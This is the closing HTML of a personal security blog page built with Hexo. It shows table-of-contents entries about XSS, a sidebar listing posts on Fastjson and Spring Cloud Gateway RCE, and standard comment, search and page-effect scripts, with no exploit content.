<span class="toc-text">7.存储型xss思考</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-self-xss"><span class="toc-number">8.</span> <span class="toc-text">8 self-xss</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#9%E6%9B%B4%E5%A4%9A%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">9.</span> <span class="toc-text">9更多的思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">10.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/06/27/hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" title="无题"><img src="/img/14.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2024/06/27/hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" title="无题">无题</a><time datetime="2024-06-27T15:07:52.030Z" title="发表于 2024-06-27 23:07:52">2024-06-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/27/JNDI%E3%80%81LDAP%E4%B8%8ERMI/" title="JNDI、ldap与rmi"><img src="/img/26.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JNDI、ldap与rmi"/></a><div class="content"><a class="title" href="/2024/06/27/JNDI%E3%80%81LDAP%E4%B8%8ERMI/" title="JNDI、ldap与rmi">JNDI、ldap与rmi</a><time datetime="2024-06-26T16:00:00.000Z" title="发表于 2024-06-27 00:00:00">2024-06-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/25/Fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Fastjson反序列化RCE"><img src="/img/42.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Fastjson反序列化RCE"/></a><div class="content"><a class="title" href="/2024/06/25/Fastjson1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Fastjson反序列化RCE">Fastjson反序列化RCE</a><time datetime="2024-06-24T16:00:00.000Z" title="发表于 2024-06-25 00:00:00">2024-06-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/23/Spring%20Cloud%20Gateway%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Spring Cloud Gateway远程命令执行漏洞复现"><img src="/img/42.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Spring Cloud Gateway远程命令执行漏洞复现"/></a><div class="content"><a class="title" href="/2024/06/23/Spring%20Cloud%20Gateway%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Spring Cloud Gateway远程命令执行漏洞复现">Spring Cloud Gateway远程命令执行漏洞复现</a><time datetime="2024-06-22T16:00:00.000Z" title="发表于 2024-06-23 00:00:00">2024-06-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/21/idea%E9%85%8D%E7%BD%AEMaven/" title="idea配置Maven"><img src="/img/6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="idea配置Maven"/></a><div class="content"><a class="title" href="/2024/06/21/idea%E9%85%8D%E7%BD%AEMaven/" title="idea配置Maven">idea配置Maven</a><time datetime="2024-06-20T16:00:00.000Z" title="发表于 2024-06-21 00:00:00">2024-06-21</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/56.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Qeminco</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">欢迎来到我的博客~</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://qeminco-twikoo.hf.space',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://qeminco-twikoo.hf.space',
+      region: '',
+      onCommentLoaded: () => {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+
+    
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') setTimeout(init,0)
+    else getScript('https://cdn.jsdelivr.net/npm/twikoo@1.6.31/dist/twikoo.all.min.js').then(init)
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
